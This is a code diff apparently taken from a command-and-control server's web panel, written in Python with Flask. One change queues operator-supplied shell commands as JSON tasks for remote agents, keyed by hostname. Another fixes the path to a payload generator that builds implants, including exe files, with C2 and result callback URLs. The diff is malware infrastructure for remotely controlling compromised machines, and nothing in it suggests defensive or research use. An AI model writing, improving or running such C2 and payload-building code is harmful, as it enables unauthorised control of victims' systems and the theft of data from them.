@@ -210,9 +210,13 @@ def console_send():
     data = request.get_json()
     hostname = data.get("hostname")
     command = data.get("command")
+    if not hostname or not command:
+        return jsonify({"status": "missing params"}), 400
+    # Always store as JSON for agent parsing
+    task_json = json.dumps({"action": "shell", "command": command.strip()})
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("INSERT INTO tasks (hostname, command, status, result) VALUES (?, ?, 'pending', '')", (hostname, command))
+    c.execute("INSERT INTO tasks (hostname, command, status, result) VALUES (?, ?, 'pending', '')", (hostname, task_json))
     conn.commit()
     conn.close()
     return jsonify({"status": "task added"})
@@ -342,7 +346,9 @@ def generate():
         os.makedirs(os.path.dirname(out_path), exist_ok=True)
 
         # Start building the command
-        cmd = f"python3 ../tools/generate_payload.py --c2 {c2url} --result {resulturl} --output {out_path}"
+        GENERATOR_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), "../tools/generate_payload.py"))
+        cmd = f"python3 {GENERATOR_PATH} --c2 {c2url} --result {resulturl} --output {out_path}"
+
 
         # Optional flags
         if ext == 'exe':
